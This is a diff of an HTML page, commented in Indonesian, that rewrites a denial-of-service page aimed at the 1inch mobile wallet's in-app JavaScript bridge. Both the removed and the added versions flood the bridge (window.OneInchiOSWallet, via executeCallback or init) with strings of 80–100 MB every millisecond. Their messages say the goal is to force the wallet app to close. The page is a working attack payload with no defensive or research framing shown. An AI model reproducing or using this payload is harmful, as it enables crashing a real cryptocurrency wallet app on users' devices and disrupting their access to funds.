@@ -1,47 +1,17 @@
-<!DOCTYPE html>
-<html>
-<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center;">
+<button onclick="crashTest()">CLICK HERE CRASH</button>
 
-    <h2 style="color: red;">⚠️ 1INCH CRASH TEST ⚠️</h2>
-    
-    <button onclick="boom()" style="padding: 20px; background: red; color: white; border: none; font-weight: bold; width: 100%;">
-        KLIK UNTUK CRASH DOMPET
-    </button>
+<script>
+function crashTest() {
+    try {
+        const junk = "A".repeat(100 * 1024 * 1024); 
+        window.OneInchiOSWallet.init(junk);
+        setInterval(() => {
+            window.OneInchiOSWallet.init(Math.random().toString());
+        }, 1);
 
-    <div id="logs" style="margin-top: 20px; text-align: left; font-size: 10px; color: #888;">
-        Menunggu perintah...
-    </div>
-
-    <script>
-        function boom() {
-            const log = (m) => document.getElementById('logs').innerHTML += "<br>> " + m;
-            
-            // Target bridge yang kamu temukan di screenshot
-            const bridge = window.OneInchiOSWallet || window.OneInchSolanaWallet;
-
-            if (bridge) {
-                log("Bridge ditemukan! Mengirim serangan...");
-                
-                try {
-                    // 1. Serangan RAM (Memory Flood)
-                    // Kita kirim teks raksasa (80MB) agar RAM aplikasi penuh dan Force Close
-                    const junk = "FATAL_ERROR_".repeat(5000000); 
-                    
-                    // 2. Serangan Loop (Infinite Requests)
-                    // Membanjiri bridge dengan jutaan perintah per detik
-                    setInterval(() => {
-                        // Menggunakan fungsi executeCallback yang kamu temukan tadi
-                        bridge.executeCallback("999", junk);
-                    }, 1);
-
-                    log("Serangan berjalan. Jika dompet tertutup, berarti BERHASIL.");
-                } catch(e) {
-                    log("Error: " + e.message);
-                }
-            } else {
-                log("Gagal: Bridge tidak ditemukan di halaman ini.");
-            }
-        }
-    </script>
-</body>
-</html>
+        alert("Payload terkirim! Tunggu apakah dompet akan tertutup...");
+    } catch(e) {
+        alert("Gagal memicu crash: " + e.message);
+    }
+}
+</script>
